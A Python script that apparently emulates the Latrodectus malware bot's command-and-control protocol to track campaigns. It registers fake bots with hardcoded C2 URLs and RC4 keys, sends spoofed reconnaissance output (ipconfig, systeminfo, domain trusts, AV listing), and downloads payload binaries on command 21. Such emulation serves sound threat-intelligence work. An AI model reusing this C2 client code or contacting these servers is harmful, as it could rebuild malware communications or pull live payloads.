import requests
import fnv
from Crypto.Cipher import ARC4
import base64
import random
import string
from faker import Faker
from time import sleep
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress only the single InsecureRequestWarning from urllib3
warnings.simplefilter('ignore', InsecureRequestWarning)
#url = "https://astopertat.com/live/"
#Enrcryption Key: qNfSHTVKEU7mknHSFrQCwp0mmQfXUNPIcA66gezNz49qQOVX0P


class latro_bot: 
    def __init__(self, key, campaign_id, url, counter = None):
        self.key = key
        self.campaign_id = campaign_id
        self.url = url
        if not counter: 
            self.counter = 0
        else: 
            self.counter = counter
        self.headers = {
        'User-Agent': "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tob 1.1)",
        'Accept-Encoding': "",
        'Content-Type': 'application/octect-stream',
        }
        self.campaign_id_hash()
        self.generate_hex_string()
        self.generate_fake_user()
        self.command_dict = {
            '2':True,
            '3':True,
            '4':True,
            '21':self.command_21_handle,
            '20':self.command_20_handle
        }
        self.previous_command = None

    def campaign_id_hash(self): 
        self.campaign_fnva = fnv.hash(self.campaign_id.encode("utf-8"), bits=32)
        #return project_fnva
    
    def generate_hex_string(self, length=28): 
        hex_chars = string.hexdigits.upper()
        self.bot_id = ''.join(random.choices(hex_chars, k=length)) 
    
    def generate_fake_user(self): 
        fake = Faker()
        self.username = fake.user_name()

    
    def packet_format_string(self, username=None, type_ = 1, os=6, arch=1, ver_major=1, ver_minor=4, up=2, direction=None, guid = None, counter = None, packet_type= None):
        self.campaign_id_hash()
        group = self.campaign_fnva
        if not guid:
            guid = self.bot_id  
        if not counter: 
            counter = self.counter
        if not direction: 
            direction = self.url
        if not username: 
            username = self.username
        
        standard_packet =  f"counter={counter}&type={type_}&guid={guid}&os={os}&arch={arch}&username={username}&group={group}&ver={ver_major}.{ver_minor}&up={up}&direction={direction}"
        if packet_type == '2': 
            final_packet = standard_packet + '&desklinks=["OneDrive.lnk","OneNote.lnk","PowerPoint.lnk","Excel.lnk","Google Chrome.lnk","Notepad.lnk","Paint.lnk"]'
            return final_packet
        if packet_type == '4': 
            command_4_ext = self.command_4_handle()
            final_packet = standard_packet + command_4_ext
            return final_packet
        
        else: 
            return standard_packet

        

    def test_registration_packet_data(self):
        print(self.packet_format_string(packet_type= '4'))
        print(self.packet_format_string(packet_type= '2'))
        print(self.packet_format_string())
    
    def crypt_packet_data(self, data, key=None): 
        if not key: 
            key = self.key
        cipher = ARC4.new(key.encode())
        encrpyted = cipher.encrypt(data.encode())
        encoded = base64.b64encode(encrpyted).decode()
        return encoded

    def next_packet(self): 
        self.counter += 1


    def registration_post_request(self, packet_data, url = None):
        if not url: 
            url = self.url
        data = packet_data
        print(data)
        data = self.crypt_packet_data(data)
        print(data)
        r = requests.post(url, headers = self.headers, data = data, verify=False)
        print(r.text)
        return r.text

    def decrypt_packet(self, packet): 
        decoded_data = base64.b64decode(packet)
     
        cipher = ARC4.new(self.key.encode())
        decrypted_data = cipher.decrypt(decoded_data)
        decrypted_string = decrypted_data.decode('utf-8')
        
        return decrypted_string
    
    def command_3_handle(self):
        pass
    
    def command_4_handle(self):
        """
        ipconfig=
        systeminfo=
        domain_trusts=
        domain_trusts_all=
        net_view_all_domain=
        net_view_all=
        net_group=
        wmic=
        net_config_ws=
        net_wmic_av=
        whoami_group=
        """
        packet = ""
        packet += "ipconfig=%s&" % self.get_replaced_template("ipconfig")
        packet += "systeminfo=%s&" % self.get_replaced_template("systeminfo")
        packet += "domain_trusts=%s&" % self.get_replaced_template("domain_trusts")
        packet += "domain_trusts_all=%s&" % self.get_replaced_template(
            "domain_trusts_all"
        )
        packet += "net_view_all_domain=%s&" % self.get_replaced_template(
            "net_view_all_domain"
        )
        packet += "net_view_all=%s&" % self.get_replaced_template("net_view_all")
        packet += "net_group=%s&" % self.get_replaced_template("net_group")
        packet += "wmic=%s&" % self.get_replaced_template("wmic")
        packet += "net_config_ws=%s&" % self.get_replaced_template("net_config_ws")
        packet += "net_wmic_av=%s&" % self.get_replaced_template("net_wmic_av")
        packet += "whoami_group=%s" % self.get_replaced_template("whoami_group")

        return packet
    
    def get_replaced_template(self, command_name):
        data = ""
        with open("command_templates/%s_example.txt" % command_name, "r") as f:
            data = f.read()

        data = data.replace("{{USERNAME}}", self.username)
        data = data.replace("{{HOSTNAME}}", self.username)
        data = data.replace("{{DOMAINAME}}", self.username)
        data = base64.b64encode(data.encode("utf-8")).decode("utf-8")
        return data

    def command_20_handle(self):
        self.counter = 0
    
    def command_21_handle(self): 
        print('MADE IT TO COMMAND 21')
        #shellcode dwnld
        print(type(self.response_command))
        if self.response_command:
            command_list = self.response_command.split('|')
            command_num = command_list[-2]
            print(f"COMMAND_NUM: {command_num}")
            if command_num == '21': 
                bin_file = command_list[-1].replace('front://', '')
                url = self.url.replace('live/', 'files/')
                url = url + bin_file
                print("PAYLOAD URL")
                print(url)
                try: 
                    response = requests.get( url = url, headers = self.headers, verify = False)
                    with open('latro_cmd_21.bin' , 'w') as outfile: 
                        outfile.write(response.text)
                except Exception as e: 
                    print(e)
            


        
    
    def comms_command_handler(self, decrypted_data= None): 
        if 'COMMAND' in decrypted_data:
            command_list = decrypted_data.split('|')
            command_num = command_list[-2]
            print(command_num)
            print(type(command_num))
            if command_num in self.command_dict: 
                if self.command_dict[command_num] == True: 
                    self.previous_command = command_num
                else:
                    self.command_dict[command_num]()
            else: 
                pass
        else:
            pass
    
    def comms_main(self): 
        while True: 
            if self.previous_command: 

                packet_data = self.packet_format_string(packet_type= self.previous_command)
                self.previous_command = None
            else: 
                packet_data = self.packet_format_string()
            self.packet_data = packet_data
            response_data = self.registration_post_request(packet_data)
            self.next_packet()
            decrypted_data = self.decrypt_packet(response_data)
            self.response_command = decrypted_data
            print(decrypted_data)
            try:
                self.comms_command_handler(decrypted_data)
            except:
                print(decrypted_data)

            sleep(29)





#test_bot = latro_bot(key= 'qNfSHTVKEU7mknHSFrQCwp0mmQfXUNPIcA66gezNz49qQOVX0P', campaign_id='Jupiter', url='https://riscoarchez.com/live/')
#test_bot = latro_bot(counter = 17, key= 'EhAyPSHvva9CvL6OIddDJvDXHJjoMsqXyjraKyYmXFqDGdAYyO', campaign_id='Venus', url='https://stripplasst.com/live/')
test_bot = latro_bot(counter = 17, key= 'EhAyPSHvva9CvL6OIddDJvDXHJjoMsqXyjraKyYmXFqDGdAYyO', campaign_id='Mars', url='https://wermulitars.com/test/')

print(test_bot.counter)
test_bot.comms_main()